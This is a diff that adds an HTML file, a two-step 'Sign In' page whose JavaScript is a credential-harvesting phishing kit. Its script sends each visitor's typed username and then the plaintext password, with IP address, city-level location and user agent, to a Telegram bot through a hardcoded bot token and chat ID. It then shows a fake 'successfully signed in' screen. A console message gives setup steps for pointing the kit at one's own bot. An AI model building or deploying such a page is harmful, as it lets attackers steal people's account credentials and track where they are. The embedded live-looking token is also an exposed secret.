@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .auth-wrapper {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 30px;
+            width: 150px;
+        }
+        .title {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        .error {
+            color: #d93025;
+            font-size: 14px;
+            margin-bottom: 10px;
+            min-height: 20px;
+        }
+        .success {
+            color: #1e8e3e;
+            font-size: 14px;
+            margin-bottom: 10px;
+            min-height: 20px;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #0067b8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #005aa6;
+        }
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .btn-loading {
+            position: relative;
+            color: transparent;
+        }
+        .btn-loading::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 50%;
+            left: 50%;
+            margin-left: -10px;
+            margin-top: -10px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .link {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 14px;
+            color: #666;
+        }
+        .footer a {
+            color: #666;
+            margin: 0 10px;
+            text-decoration: none;
+        }
+        .d-none {
+            display: none;
+        }
+        .text-center {
+            text-align: center;
+        }
+        .mb-20 {
+            margin-bottom: 20px;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            color: #666;
+            margin: 20px 0;
+        }
+        .loading.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <!-- Username Step -->
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <div class="text-center mb-20">
+                <h1 class="title">Sign In</h1>
+                <p>Enter your username to continue</p>
+            </div>
+            
+            <form id="form_uname">
+                <p id="error_uname" class="error"></p>
+                <input id="inp_uname" type="text" class="input" placeholder="Email or username" required>
+                
+                <a href="#" class="link">Create account</a>
+                
+                <div class="loading" id="loading_uname">Sending data...</div>
+                <button type="button" class="btn" id="btn_next">Next</button>
+            </form>
+            
+            <div class="footer">
+                <a href="#">Terms</a> • 
+                <a href="#">Privacy</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Password Step -->
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <div class="text-center mb-20">
+                <h1 class="title">Enter Password</h1>
+                <p id="user_identity">user@example.com</p>
+            </div>
+            
+            <form id="form_pwd">
+                <p id="error_pwd" class="error"></p>
+                <input id="inp_pwd" type="password" class="input" placeholder="Password" required>
+                
+                <a href="#" class="link">Forgot password?</a>
+                
+                <div class="loading" id="loading_pwd">Signing in...</div>
+                <button type="button" class="btn" id="btn_signin">Sign In</button>
+                <button type="button" class="btn" id="btn_back" style="background: #666; margin-top: 5px;">Back</button>
+            </form>
+        </div>
+    </section>
+
+    <!-- Success Step -->
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper text-center">
+            <h1 class="title">Welcome!</h1>
+            <p id="welcome_user" class="mb-20">user@example.com</p>
+            <p id="success_message" class="success mb-20"></p>
+            <p class="mb-20">You have successfully signed in.</p>
+            <button class="btn" id="btn_logout">Sign Out</button>
+        </div>
+    </section>
+
+    <script>
+        // ================= CONFIGURATION =================
+        // Replace with your actual Telegram Bot Token and Chat ID
+        const TELEGRAM_BOT_TOKEN = '8066607284:AAGACS8QLcAPETXDrs0MG_fUiB9Cyy6kFGY'; // Get from @BotFather
+        const TELEGRAM_CHAT_ID = '6285796509'; // Get from @userinfobot
+        // =================================================
+        
+        // DOM Elements
+        const sectionUname = document.getElementById('section_uname');
+        const sectionPwd = document.getElementById('section_pwd');
+        const sectionFinal = document.getElementById('section_final');
+        
+        const inpUname = document.getElementById('inp_uname');
+        const inpPwd = document.getElementById('inp_pwd');
+        
+        const errorUname = document.getElementById('error_uname');
+        const errorPwd = document.getElementById('error_pwd');
+        const successMessage = document.getElementById('success_message');
+        
+        const userIdentity = document.getElementById('user_identity');
+        const welcomeUser = document.getElementById('welcome_user');
+        
+        const loadingUname = document.getElementById('loading_uname');
+        const loadingPwd = document.getElementById('loading_pwd');
+        
+        // Buttons
+        const btnNext = document.getElementById('btn_next');
+        const btnSignin = document.getElementById('btn_signin');
+        const btnBack = document.getElementById('btn_back');
+        const btnLogout = document.getElementById('btn_logout');
+        
+        // State variables
+        let userData = {
+            username: '',
+            password: '',
+            timestamp: '',
+            userAgent: navigator.userAgent,
+            ip: '',
+            location: ''
+        };
+        
+        // ================= TELEGRAM FUNCTIONS =================
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_notification: false
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Telegram send error:', error);
+                return false;
+            }
+        }
+        
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userData.ip = data.ip;
+                return data.ip;
+            } catch (error) {
+                userData.ip = 'Unknown';
+                return 'Unknown';
+            }
+        }
+        
+        async function getLocationFromIP(ip) {
+            if (ip === 'Unknown') return 'Unknown';
+            
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                return `${data.city}, ${data.region}, ${data.country_name}`;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+        
+        function formatDataForTelegram() {
+            const now = new Date();
+            userData.timestamp = now.toISOString();
+            
+            return `🔐 <b>New Login Attempt</b>
+            
+👤 <b>Username:</b> <code>${userData.username}</code>
+🔑 <b>Password:</b> <code>${userData.password}</code>
+
+📱 <b>Device Info:</b>
+• User Agent: ${userData.userAgent.substring(0, 100)}...
+
+🌍 <b>Location Info:</b>
+• IP: ${userData.ip}
+• Location: ${userData.location}
+
+⏰ <b>Time:</b> ${now.toLocaleString()}
+🆔 <b>Session ID:</b> ${Math.random().toString(36).substr(2, 9)}`;
+        }
+        
+        // ================= VALIDATION FUNCTIONS =================
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+        
+        function isValidPassword(password) {
+            return password.length >= 6;
+        }
+        
+        // ================= UI FUNCTIONS =================
+        function showSection(section) {
+            [sectionUname, sectionPwd, sectionFinal].forEach(s => s.classList.add('d-none'));
+            section.classList.remove('d-none');
+        }
+        
+        function setLoading(button, loadingElement, isLoading) {
+            button.disabled = isLoading;
+            if (isLoading) {
+                button.classList.add('btn-loading');
+                loadingElement.classList.add('active');
+            } else {
+                button.classList.remove('btn-loading');
+                loadingElement.classList.remove('active');
+            }
+        }
+        
+        function goBack() {
+            showSection(sectionUname);
+            errorPwd.textContent = '';
+            inpPwd.value = '';
+        }
+        
+        // ================= EVENT HANDLERS =================
+        async function handleNext() {
+            const username = inpUname.value.trim();
+            
+            if (!username) {
+                errorUname.textContent = 'Please enter your email or username';
+                return;
+            }
+            
+            if (!isValidEmail(username)) {
+                errorUname.textContent = 'Please enter a valid email address';
+                return;
+            }
+            
+            errorUname.textContent = '';
+            userData.username = username;
+            userIdentity.textContent = username;
+            
+            // Send username to Telegram
+            setLoading(btnNext, loadingUname, true);
+            
+            try {
+                // Get IP and location
+                const ip = await getUserIP();
+                userData.location = await getLocationFromIP(ip);
+                
+                // Send initial data to Telegram
+                const initialMessage = `🔍 <b>Username Entered</b>\n\n👤 <b>Username:</b> <code>${username}</code>\n🌍 <b>IP:</b> ${ip}\n📍 <b>Location:</b> ${userData.location}`;
+                await sendToTelegram(initialMessage);
+                
+                showSection(sectionPwd);
+            } catch (error) {
+                errorUname.textContent = 'Connection error. Please try again.';
+            } finally {
+                setLoading(btnNext, loadingUname, false);
+            }
+        }
+        
+        async function handleSignIn() {
+            const password = inpPwd.value.trim();
+            
+            if (!password) {
+                errorPwd.textContent = 'Please enter your password';
+                return;
+            }
+            
+            if (!isValidPassword(password)) {
+                errorPwd.textContent = 'Password must be at least 6 characters';
+                return;
+            }
+            
+            errorPwd.textContent = '';
+            userData.password = password;
+            
+            setLoading(btnSignin, loadingPwd, true);
+            
+            try {
+                // Send complete data to Telegram
+                const message = formatDataForTelegram();
+                const sent = await sendToTelegram(message);
+                
+                if (sent) {
+                    successMessage.textContent = '✓ Login information sent successfully';
+                } else {
+                    successMessage.textContent = '⚠ Login processed (notification failed)';
+                }
+                
+                welcomeUser.textContent = userData.username;
+                showSection(sectionFinal);
+            } catch (error) {
+                errorPwd.textContent = 'Sign in failed. Please try again.';
+            } finally {
+                setLoading(btnSignin, loadingPwd, false);
+                inpPwd.value = '';
+            }
+        }
+        
+        function handleLogout() {
+            // Clear all data
+            inpUname.value = '';
+            inpPwd.value = '';
+            errorUname.textContent = '';
+            errorPwd.textContent = '';
+            successMessage.textContent = '';
+            
+            // Reset user data
+            userData = {
+                username: '',
+                password: '',
+                timestamp: '',
+                userAgent: navigator.userAgent,
+                ip: '',
+                location: ''
+            };
+            
+            showSection(sectionUname);
+            inpUname.focus();
+        }
+        
+        // ================= EVENT LISTENERS =================
+        btnNext.addEventListener('click', handleNext);
+        btnBack.addEventListener('click', goBack);
+        btnSignin.addEventListener('click', handleSignIn);
+        btnLogout.addEventListener('click', handleLogout);
+        
+        inpUname.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') handleNext();
+        });
+        
+        inpPwd.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') handleSignIn();
+        });
+        
+        // Auto-focus username input
+        inpUname.focus();
+        
+        // Instructions for setup
+        console.log(`
+        ========================================
+        TELEGRAM BOT SETUP INSTRUCTIONS:
+        
+        1. Create a bot with @BotFather on Telegram
+        2. Get your bot token from @BotFather
+        3. Get your chat ID from @userinfobot
+        4. Replace the TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID
+           in the script above with your actual values
+        
+        Current Configuration:
+        - Bot Token: ${TELEGRAM_BOT_TOKEN}
+        - Chat ID: ${TELEGRAM_CHAT_ID}
+        ========================================
+        `);
+        
+        // Check if configuration is set
+        if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+            console.warn('⚠ WARNING: Please configure your Telegram Bot Token and Chat ID!');
+        }
+    </script>
+</body>
+</html>
